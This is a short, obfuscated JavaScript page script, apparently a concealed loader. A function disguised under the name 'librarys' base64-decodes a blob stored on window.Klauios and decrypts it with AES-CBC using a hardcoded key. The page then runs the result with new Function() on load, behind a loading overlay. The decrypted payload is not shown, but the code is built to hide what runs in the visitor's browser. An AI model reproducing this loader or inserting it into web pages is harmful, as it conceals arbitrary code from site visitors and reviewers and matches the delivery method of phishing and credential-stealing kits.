const loadingOverlay = document.getElementById("loading-overlay");
function librarys(_0x1822a7, _0x3f2c6c) {
  var _0x1a1762 = forge.util.decode64(_0x1822a7);
  var _0x3c1563 = 16;
  var _0x5115a2 = _0x1a1762.substring(0, _0x3c1563);
  var _0x1a3c81 = _0x1a1762.substring(_0x3c1563);
  var _0x13e97b = forge.cipher.createDecipher("AES-CBC", _0x3f2c6c);
  var _0x27ed35 = forge.util.createBuffer(_0x1a3c81);
  var _0x3e6855 = {
    iv: _0x5115a2
  };
  _0x13e97b.start(_0x3e6855);
  _0x13e97b.update(_0x27ed35);
  var _0x8d370b = _0x13e97b.finish();
  if (_0x8d370b) {
    var _0xd114e5 = _0x13e97b.output.getBytes();
    var _0x18e2c0 = forge.util.decodeUtf8(_0xd114e5);
    return _0x18e2c0;
  } else {
    return null;
  }
}
function executeCode() {
  const _0x1b326a = "XghA0vNrxjSFlGziV9p1kyQEo3ms7ZID";
  const _0x17d470 = librarys(window.Klauios, _0x1b326a);
  const _0x3407a7 = new Function(_0x17d470);
  _0x3407a7();
}
executeCode();
loadingOverlay.remove();